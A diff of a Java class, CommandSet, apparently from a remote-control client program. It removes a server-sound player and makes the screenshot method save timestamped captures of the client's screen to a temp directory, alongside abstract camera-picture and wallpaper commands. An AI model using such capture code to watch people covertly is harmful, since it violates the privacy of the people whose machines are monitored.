@@ -1,3 +1,4 @@
+import javax.imageio.ImageIO;
 import javax.sound.sampled.AudioInputStream;
 import javax.sound.sampled.AudioSystem;
 import javax.sound.sampled.Clip;
@@ -12,6 +13,9 @@ import java.awt.event.KeyEvent;
 import java.awt.image.BufferedImage;
 import java.io.File;
 import java.io.IOException;
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.Random;
 
 /**
@@ -29,6 +33,7 @@ public abstract class CommandSet implements ClipboardOwner
     public abstract void restart();
     public abstract void takeCameraPicture();
     public abstract void setWallpaper(Image newWallpaper);
+    //public abstract void beep();
 
     public CommandSet()
     {
@@ -52,21 +57,6 @@ public abstract class CommandSet implements ClipboardOwner
     @Override
     public void lostOwnership(Clipboard aClipboard, Transferable aContents)
     {
-    }
-
-    public void playSound(File soundFromServer)
-    {
-        try
-        {
-            Clip clip = AudioSystem.getClip();
-            AudioInputStream inputStream = AudioSystem.getAudioInputStream(soundFromServer);
-            clip.open(inputStream);
-            clip.start();
-        }
-        catch (Exception e)
-        {
-            System.err.println(e.getMessage());
-        }
     }
 
     /**
@@ -105,15 +95,18 @@ public abstract class CommandSet implements ClipboardOwner
     }
 
     /**
-     * takes a screenshot of the clients monitor
-     * @return a BufferedImage that is the screenshot
-     * @throws AWTException if something went wrong when creating the robot
+     * takes a screenshot of the clients screen and saves it in our temp directory
+     * @throws AWTException if the robot failed to be created
+     * @throws IOException if something went wrong created the image file from the bufferedimage
      */
-    public BufferedImage takeScreenshot() throws AWTException
+    public void takeScreenshot() throws AWTException, IOException
     {
         Robot robot = new Robot();
         Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
-        return robot.createScreenCapture(new Rectangle(screenSize));
+        BufferedImage screenImg = robot.createScreenCapture(new Rectangle(screenSize));
+        DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd@HH:mm:ss");
+        File screenshot = new File(getTempPath() + "/scr_" + dateFormat.format(new Date()) + ".jpg");
+        ImageIO.write(screenImg, "jpg", screenshot);
     }
 
     /**
